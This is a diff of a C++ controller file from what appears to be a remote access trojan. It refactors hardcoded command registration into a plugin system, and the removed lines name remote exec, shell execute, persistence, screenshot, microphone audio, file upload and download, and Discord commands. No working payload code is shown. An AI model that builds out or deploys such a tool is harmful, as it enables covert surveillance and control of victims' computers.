@@ -1,4 +1,3 @@
-#include "controller.h"
 #include <memory>
 #include <iostream>
 #include <string>
@@ -7,13 +6,17 @@
 #include <thread>
 #include <cstdint>
 #include <stdexcept>
+#include <thread>
+
+#include <asio.hpp>
+#include "controller.h"
 #include "controllerimpl.h"
 #include "log.h"
-#include "commands.h"
 #include "simplepacket.h"
-#include <asio.hpp>
-#include <thread>
+#include "plugin.h"
+
 using namespace std;
+
 
 /**
  * Lock-free queue to hold audio data from mic.
@@ -22,19 +25,7 @@ using namespace std;
  */
 // boost::lockfree::spsc_queue<char, boost::lockfree::capacity<8192>> audio_buf;
 
-Controller::Controller(string host, uint16_t port) : impl(make_unique<ControllerImpl>(host, port)) {
-	register_command<NavigationCommand>();
-	register_command<DiscordCommand>();
-	register_command<ExecCommand>();
-	register_command<ScreenshotCommand>();
-	register_command<AudioCommand>();
-	register_command<DownloadFileCommand>();
-	register_command<UploadFileCommand>();
-	register_command<PersistCommand>();
-	register_command<DialogCommand>();
-	register_command<ShowoffCommand>();
-	register_command<ShellExecuteCommand>();
-}
+Controller::Controller(string host, uint16_t port) : impl(make_unique<ControllerImpl>(host, port)) {}
 
 Controller::~Controller() = default;
 
@@ -84,6 +75,11 @@ void Controller::err_println(string err) {
 void Controller::send_buffer(const vector<uint8_t> buf) {
 	SimplePacket<vector<uint8_t>> pkt(3, buf);
 	send_packet(pkt);
+}
+
+void Controller::register_plugin(unique_ptr<Plugin> builder) {
+	builder->init(*this);
+	impl->plugins.push_back(std::move(builder));
 }
 
 void Controller::register_command(unique_ptr<CommandBuilder> builder) {
